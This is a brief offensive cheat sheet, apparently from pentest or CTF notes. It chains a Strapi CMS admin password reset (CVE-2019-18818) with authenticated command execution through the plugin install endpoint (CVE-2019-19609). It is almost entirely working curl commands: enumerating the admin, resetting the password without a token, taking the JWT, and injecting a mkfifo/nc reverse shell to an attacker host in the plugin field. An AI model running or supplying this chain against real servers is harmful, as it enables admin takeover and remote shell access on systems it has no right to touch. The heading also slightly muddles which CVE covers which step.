# Strapi CMS Password Reset + Authenticated RCE

Strapi <4.0.0-beta.21.3 (CVE-2019-19609): unauthenticated password reset for admin. Once authenticated, use the plugin install endpoint to execute commands.

```bash
# Enumerate Strapi version and admin email from API
curl -s http://<TARGET>/admin/init | python3 -m json.tool

# CVE-2019-18818: Admin password reset (no token required)
curl -s -X POST http://<TARGET>/admin/auth/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"code":{},"password":"Passw0rd!","passwordConfirmation":"Passw0rd!"}'

# Log in and get JWT
TOKEN=$(curl -s -X POST http://<TARGET>/admin/auth/local \
  -H 'Content-Type: application/json' \
  -d '{"identifier":"admin@<TARGET>","password":"Passw0rd!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['jwt'])")

# CVE-2019-19609: Authenticated RCE via plugin install
curl -s -X POST http://<TARGET>/admin/plugins/install \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)","port":"80"}'
```
